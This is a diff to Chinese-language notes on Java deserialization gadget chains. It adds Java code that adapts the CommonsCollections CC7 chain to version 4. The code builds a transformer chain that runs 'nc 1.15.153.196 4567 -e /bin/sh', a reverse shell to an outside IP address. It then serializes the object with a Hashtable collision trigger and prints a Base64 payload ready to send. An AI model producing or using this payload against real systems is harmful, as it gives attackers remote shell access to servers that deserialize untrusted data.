@@ -43,3 +43,37 @@ CC2链：java<=JDK8u71(1.8.0_71)、CommonsCollections=4
 
 CC7链：java<=JDK8u71(1.8.0_71)、commons-collections:<=3.2.1
 CC5链：java<=JDK8u71(1.8.0_71)、commons-collections:<=3.2.1
+
+^
+CC7链改成适用CommonsCollections=4
+```
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc 1.15.153.196 4567 -e /bin/sh"})
+        };
+        Transformer transformerChain2 = new ChainedTransformer(transformers);
+
+        //使用Hashtable来构造利用链调用LazyMap
+        Map hashMap1 = new HashMap();
+        Map hashMap2 = new HashMap();
+        Class<DefaultedMap> d = DefaultedMap.class;
+        Constructor<DefaultedMap> declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class);
+        declaredConstructor.setAccessible(true);
+        DefaultedMap defaultedMap1 = declaredConstructor.newInstance(hashMap1, transformerChain2);
+        DefaultedMap defaultedMap2 = declaredConstructor.newInstance(hashMap2, transformerChain2);
+
+        defaultedMap1.put("yy", 1);
+        defaultedMap2.put("zZ", 1);
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(defaultedMap1, 1);
+        hashtable.put(defaultedMap2, 1);
+        defaultedMap2.remove("yy");
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(hashtable);
+        String payload = new String(Base64.getEncoder().encode(baos.toByteArray()));
+        System.out.println(payload);
+
+```
